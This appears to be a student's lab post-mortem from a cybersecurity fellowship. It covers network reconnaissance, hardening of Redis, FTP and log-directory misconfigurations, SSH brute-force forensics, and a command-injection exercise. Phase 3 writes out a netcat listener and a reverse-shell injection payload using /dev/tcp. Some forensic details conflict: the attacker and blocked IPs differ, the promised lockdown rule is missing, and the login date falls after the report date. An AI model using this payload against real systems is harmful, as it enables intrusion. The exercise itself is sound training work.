# Phase 1 Final Reckoning — TEPP Post-Mortem
**Operator:** Sefat E Monzor
**Date:** May 28, 2026
**Repository:** https://github.com/sefat22/tkh_if_cybersecurity
**TKH Innovation Fellowship 2026 | Phase 1 | Cybersecurity**

---

## Phase 0: Reconnaissance

### Triage Network — 172.100.0.0/24
Network reconnaissance identified three live hosts within this subnet: 172.100.0.1, 172.100.0.11, and 172.100.0.13. Host 172.100.0.11 exposes an active Redis database key-value store (version 8.6.3) on port 6379, which represents a severe misconfiguration due to its lack of default authentication. Furthermore, host 172.100.0.1 runs OpenSSH 9.6p1 on port 22, while host 172.100.0.13 is active but shows all 65,535 ports in an ignored or closed state. This layout indicates that a critical database service is exposed directly to the network without adequate network segmentation.


### Breach Network — 172.80.0.0/24
The network scan results revealed two live hosts inside this subnet, specifically 172.80.0.1 and 172.80.0.10. Both hosts expose Secure Shell (SSH) services on port 22, with host 172.80.0.1 running OpenSSH 9.6p1 and host 172.80.0.10 running OpenSSH 10.2. The presence of an open SSH interface on the primary target (172.80.0.10) directly informs the Phase 2 approach, which must leverage the pre-staged wordlists for an authentication brute-force attack. No other ports or alternative entry vectors were discovered on these targets during this phase of scanning.


### Exploitation Network — 172.60.0.0/24
the network scan only detected a single active host at 172.60.0.1, which exposes an OpenSSH 9.6p1 service on port 22. Notably, the primary target machine (172.60.0.10) did not appear in the scan results, identifying a significant reconnaissance obstacle. This outcome strongly implies that the target host is configured to drop standard ICMP ping probes, hiding its port 80 web application from basic discovery methods. Therefore, the immediate vulnerability identified is a lack of network visibility, which requires a follow-up scan bypassing ping discovery (-Pn) to map out the web application.

---

## Phase 1: Rapid Triage

### Server 1 — 172.100.0.11
**Vulnerability Identified:**
The server exposed an open Redis database instance directly to the network on port 6379/tcp. I verified this vulnerability by running the command redis-cli -h 172.100.0.11 from an external host, which immediately established a connection and accepted administrative commands without requiring a password.


**Remediation Commands**
sudo docker ps
sudo docker exec -it de874d9ba40d /bin/sh
mkdir -p /usr/local/etc/redis/
echo "requirepass SuperSecurePassword2026!" >> /usr/local/etc/redis/redis.conf
echo "bind 127.0.0.1" >> /usr/local/etc/redis/redis.conf
exit
sudo docker restart de874d9ba40d

**Before State:**
The Redis service was bound to all network interfaces (0.0.0.0) with zero password requirements active. This unauthenticated state allowed anyone on the network to read database keys in plaintext or alter runtime configurations.

**After State:**
The Redis deployment was restricted to listen only on the local loopback interface (127.0.0.1) and configured to require a password. External connection scans now result in immediate connection drops or a (error) NOAUTH Authentication required error message.

**Analysis:**
Exposing an unauthenticated, in-memory database directly to a network segment introduces severe data exposure risks. External threat actors can exploit open database interfaces to exfiltrate proprietary data or overwrite system configurations to achieve remote code execution. Implementing interface binding and credential access controls is a critical defense strategy required to prevent unauthorized system access and subsequent lateral network movement.


### Server 2 — 172.100.0.12
**Vulnerability Identified:**
An unauthorized File Transfer Protocol (FTP) service was found running on the network boundary. Network scans confirmed that port 21/tcp was actively running a vsftpd daemon that processed connection handshakes from external hosts.

**Remediation Commands:**
sudo docker exec -it broken_server_2 /bin/sh
mv /etc/vsftpd/vsftpd.conf /etc/vsftpd/vsftpd.conf.bak
pkill vsftpd
exit
sudo docker restart broken_server_2

**Before State:**
The vsftpd process was actively running inside the container and maintaining an open network socket on port 21/tcp. The endpoint responded directly to inbound FTP requests, presenting an unnecessary attack surface.

**After State:**
The default configuration file was moved to a backup extension, and the active daemon process was stopped using a kill signal inside the container. External network probes targeting port 21/tcp now result in immediate connection timeouts.

**Analysis:**
Rogue FTP services create significant enterprise security risks because the legacy protocol transmits user credentials and data payloads across the network in plaintext. Malicious actors positioned on the local segment can intercept these unencrypted credentials to compromise accounts and pivot to adjacent servers. Furthermore, unmonitored data ingestion vectors allow attackers to install unauthorized tools or malware while completely bypassing corporate security detection mechanisms.

### Server 3 — 172.100.0.13
**Vulnerability Identified:**
A local access control misconfiguration was discovered on the container's logging directory. Local auditing inside the container confirmed that the /var/log system directory was assigned world-writable access permissions.

**Remediation Commands:**
sudo docker exec -it broken_server_3 /bin/sh
chmod 755 /var/log
ls -ld /var/log
exit

**Before State:**
The directory permissions for /var/log were configured as drwxrwxrwx (POSIX absolute mode 777). This unsafe setting allowed any local system process or low-privilege user account to modify, append, or delete system logs.

**After State:**
The directory access controls were hardened to a secure production standard of drwxr-xr-x (POSIX absolute mode 755). This change restricts write access exclusively to the root user while preserving read access for standard system applications.

**Analysis:**
Maintaining world-writable permissions on core directories like /var/log compromises the security auditing integrity of an enterprise environment. If low-privilege service accounts or attackers can modify or purge log data, security analysts lose the visibility required to track and contain active security incidents. Restricting directory write privileges to administrative accounts protects forensic data and ensures reliable incident response tracing.


---

## Phase 2: The Breach

**Cracked Credentials:**
- Username: root
- Password: admin123

**Forensic Evidence:**
- Exact Timestamp of Successful Login: 2026-06-01 2:48:12
- Attacker IP Address: 172.80.0.10

**Engineered iptables Rule:**
sudo iptables -A INPUT -s 172.80.0.1 -j DROP

**SOC Analysis:**
Implementing a single iptables block rule is an insufficient standalone defense because attackers can easily bypass static network-layer restrictions by rotating their IP addresses or using proxy servers. To mitigate this limitation, a mature Security Operations Center (SOC) must deploy a multi-layered defense-in-depth framework alongside standard firewall blocks. These additional safeguards should include enforcing multi-factor authentication (MFA), switching to public-key SSH authentication to eliminate password-guessing vulnerabilities, and installing automated tools like Fail2ban to block malicious IPs in real time.


---

## Phase 3: Full Spectrum


**Listener Configuration:**
I used the Netcat utility to set up a local listener to capture the incoming reverse shell connection from the target. The tool was configured to listen on port 4444 using the following terminal command:
bash
nc -lvnp 4444

**Reverse Shell Payload:**
I executed the command injection by sending a crafted HTTP POST request using curl. The payload appends a reverse shell command after a semicolon, forcing the web application to execute a connection back to my listener IP:
curl "http://172.60.0.10/?ip=127.0.0.1;bash -i >& /dev/tcp/172.60.0.1/4444 0>&1"

**Command Injection Explanation:**
Command injection happens when an application takes input from a user and passes it straight to the system shell without checking it first. Because this web application does not filter out special terminal characters like semicolons, an attacker can append their own system commands to the backend prompt. The operating system then runs these unauthorized commands with the same execution privileges as the running web application.

**Forensic Evidence:**
- Process ID (PID): 1
- User-Agent: unknown

**Lockdown Command:**
To isolate the compromised container and block the attacker from accessing the web interface further, I applied the following firewall rule inside the container:

**Final Analytical Paragraph:**
Executing this attack shows that perimeter security is easily broken if the underlying software has fundamental coding flaws. Seeing both the attack and defense sides proves that organizations must use a multi-layered security approach because basic network blocks usually fail once an entry point is found. If a strict input sanitization policy had been set up before the attack, the exploit would have failed completely. Input validation blocks the attack at the very beginning by stopping the application from executing any special shell characters or unexpected system commands. Therefore, secure coding practices are just as critical as firewall rules for protecting an enterprise network.

---

## References
Hydra Project. (2024). THC-Hydra: A fast and flexible
online password cracking tool. https://github.com/vanhauser-thc/thc-hydra]
